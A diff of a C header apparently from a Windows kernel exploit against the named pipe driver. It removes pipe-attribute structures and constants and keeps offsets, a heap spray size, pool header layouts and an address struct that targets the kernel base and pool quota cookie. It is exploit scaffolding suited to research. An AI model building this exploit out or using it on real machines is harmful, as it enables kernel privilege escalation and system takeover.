@@ -23,7 +23,6 @@
 #define Npfs_imp_ExAllocatePoolWithTag_OFFSET 0x7050
 
 // Pipe structure offsets
-#define ROOT_PIPE_ATTRIBUTE_OFFSET 0x140
 #define ROOT_PIPE_QUEUE_ENTRY_OFFSET 0x48
 #define FILE_OBJECT_OFFSET 0x30
 
@@ -41,12 +40,6 @@
 
 // Spray constants
 #define SPRAY_SIZE 0x80 * 10
-
-// PipeAttribute name constants
-#define ATTRIBUTE_NAME "Z"
-#define ATTRIBUTE_NAME_LEN sizeof(ATTRIBUTE_NAME)
-#define DUMB_ATTRIBUTE_NAME "DUMB"
-#define DUMB_ATTRIBUTE_NAME_LEN sizeof(DUMB_ATTRIBUTE_NAME)
 
 // Kernel structures
 typedef struct _HEAP_VS_CHUNK_HEADER
@@ -71,15 +64,6 @@ typedef struct _POOL_HEADER
     uintptr_t ProcessBilled;
 } POOL_HEADER;
 static_assert(sizeof(POOL_HEADER) == 0x10, "POOL_HEADER must be 0x10 bytes");
-
-typedef struct pipe_attribute
-{
-    LIST_ENTRY list;
-    char* AttributeName;
-    uint64_t ValueSize;
-    char* AttributeValue;
-    char data[0];
-} pipe_attribute_t;
 
 typedef struct pipe_queue_entry
 {
@@ -133,7 +117,6 @@ typedef struct exploit_addresses
 {
     uintptr_t ghost_vs_chunk;
     uintptr_t root_pipe_queue_entry;
-    uintptr_t root_pipe_attribute;
 
     uintptr_t kernel_base;
     uintptr_t ExpPoolQuotaCookie;
